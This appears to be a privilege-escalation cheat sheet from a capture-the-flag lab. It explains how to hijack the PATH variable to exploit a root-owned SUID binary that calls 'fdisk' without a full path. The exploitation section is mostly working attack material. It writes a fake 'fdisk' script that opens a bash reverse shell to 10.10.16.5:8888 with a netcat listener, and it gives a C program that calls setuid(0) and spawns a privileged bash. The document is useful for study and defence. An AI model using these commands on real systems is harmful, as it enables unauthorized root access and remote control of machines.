# PATH Environment Variable
The PATH environment variable contains a list of directories where the shell should try to find programs.

If a program tries to execute another program, but **only specifies the program name**, rather than its **full (absolute) path**, the shell will search the PATH directories until it is found.

Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.

There are 2 prerequisites for this privilege escalation: 
- Vulnerable files must have a **SUID/SGID** with the owner being **root**.
Find SUID/SGID files on the target:

```console
┌─[kimkhuongduy@drgon]─[~/Documents/Github/template/privilege escalation/linux]
└──╼ $find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
...
-rwsr-sr-x 1 root staff 6883 May 14 2017 /bin/sysinfo
...
```
- This binary file/program tries to execute another program, but only specifies the program name, rather than its full (absolute) path.
If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string. 

We can run **strings**, **strace**, **ltrace** on the executable file to to see how the program is executing.
```console
$ strings /path/to/file
$ ltrace <command>
$ strace -v -f -e execve <command> 2>&1 | grep exec
theseus@ubuntu:/$ ltrace sysinfo
...[snip]...
popen("fdisk -l", "r")                           = 0x55e43e4e9280                 
fgets(fdisk: cannot open /dev/loop0: Permission denied
fdisk: cannot open /dev/loop1: Permission denied
fdisk: cannot open /dev/loop2: Permission denied
fdisk: cannot open /dev/loop3: Permission denied                                                   
fdisk: cannot open /dev/loop4: Permission denied
...[snip]...
```
**popen** is another way to open a process on Linux. The binary is making a call to **fdisk**, which is fine, except that it is doing so without specifying the full path. This leave the binary vulnerable to path hijacking.
## Exploitation
### Method 1:
```console
theseus@ubuntu:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.5/8888 0>&1' > fdisk
theseus@ubuntu:/dev/shm$ chmod +x fdisk
```
Don't forget to create listener on local machine
```console
┌─[✗]─[kimkhuongduy@drgon]─[~/Documents/Github/template]
└──╼ $nc -nlvp 8888
listening on [any] 8888 ...

```
### Method 2:
Create a file **fdisk.c** in directory */dev/shm* with the following contents:
```console
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```
*parameter **-p** options to use the Privileged mode (mining SUID bit)*

Compile **fdisk.c** into a file called **fdisk**:
```console
$ gcc -o fdisk fdisk.c
```
Then
```console
theseus@ubuntu:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:/dev/shm$ export PATH="/dev/shm:$PATH"
theseus@ubuntu:/dev/shm$ echo $PATH                  
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:/dev/shm$ sysinfo
```
